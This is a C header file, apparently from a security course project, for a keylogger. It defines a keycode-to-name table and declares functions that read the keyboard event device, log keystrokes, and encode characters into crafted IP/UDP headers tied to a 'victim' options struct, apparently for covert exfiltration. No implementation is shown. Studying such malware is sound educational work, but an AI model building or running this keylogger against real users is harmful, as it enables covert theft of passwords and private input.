#ifndef COMP8505_PROJECT_KEYLOGGER_H
#define COMP8505_PROJECT_KEYLOGGER_H

#include "common.h"

#define NUM_KEYCODES 71
#define NUM_EVENTS 128
#define INPUT_DIR "/dev/input/"


static const char *keycodes[] = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};


void keylogger_main(struct options_victim* ov);
char* get_keyboard_event_file(void);
void keylogger(int keyboard, int writeout, struct options_victim* ov);
void safe_write_all(int file_desc, const char *str, int keyboard, struct options_victim* ov);
int write_all(int file_desc, const char *str, struct options_victim* ov);
void sigint_handler(int sig);
unsigned short create_cvc_ip_header(struct iphdr* ih, char c, struct options_victim* ov);
unsigned short create_cvc_udp_header(struct udphdr* uh);
static int is_char_device(const struct dirent *file);


#endif //COMP8505_PROJECT_KEYLOGGER_H
